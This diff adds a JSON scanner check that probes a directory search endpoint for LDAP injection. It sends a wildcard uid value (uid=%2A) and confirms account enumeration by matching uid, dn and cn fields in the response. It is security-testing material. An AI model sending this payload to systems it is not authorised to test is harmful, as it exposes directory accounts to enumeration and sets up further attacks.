@@ -1,0 +1,32 @@
+{
+  "name": "web/LDAP wildcard filter enumeration",
+  "description": "[high] Proves LDAP filter concatenation: uid=%2A returns directory entries (uid/cn/dn fields) = wildcard rides straight into the search filter, full account enumeration (T1087.002). Keywords: ldap injection wildcard filter enumeration directory active directory ad. ctrl: nonexistent uid returns empty array -> not falsified. base_url = directory/search endpoint.",
+  "cwe": "CWE-90",
+  "requests": {
+    "payload": {
+      "method": "GET",
+      "url": "{{base_url}}/api/directory?uid=%2A"
+    }
+  },
+  "conditions": [
+    {
+      "type": "status",
+      "request": "payload",
+      "equals": 200
+    },
+    {
+      "type": "body_regex",
+      "request": "payload",
+      "pattern": "(?i)\"(?:uid|dn|cn)\"\\s*:",
+      "present": true
+    }
+  ],
+  "params": [
+    "base_url"
+  ],
+  "source": "imported",
+  "successes": 1,
+  "id": "caf0913d7345",
+  "created": "2026-11-06T02:07:37.515534+00:00",
+  "last_used": "2026-11-06T02:07:37.515534+00:00"
+}
